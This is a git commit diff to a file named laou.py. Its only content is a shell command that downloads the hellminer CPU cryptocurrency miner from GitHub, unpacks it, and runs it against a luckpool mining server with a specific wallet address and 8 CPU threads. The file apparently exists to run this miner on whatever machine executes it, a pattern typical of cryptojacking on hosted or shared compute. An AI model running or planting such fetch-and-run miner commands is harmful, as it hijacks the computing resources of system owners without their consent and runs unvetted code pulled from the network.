30df063f7fb4bb82f32557848b292d3575c47169
ivrivr237 <87616498+ivrivr237@users.noreply.github.com>
2021-11-07 12:51:19 -0800

    Update laou.py

--- laou.py
+++ laou.py
@@ -1,2 +1,2 @@
-!wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RGRjNAKjUgXzPq82GZ5kgK2ETtKLqJmPCC.Laou58 -p x --cpu 8
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956 -u RGRjNAKjUgXzPq82GZ5kgK2ETtKLqJmPCC.Laou58 -p x --cpu 8
 
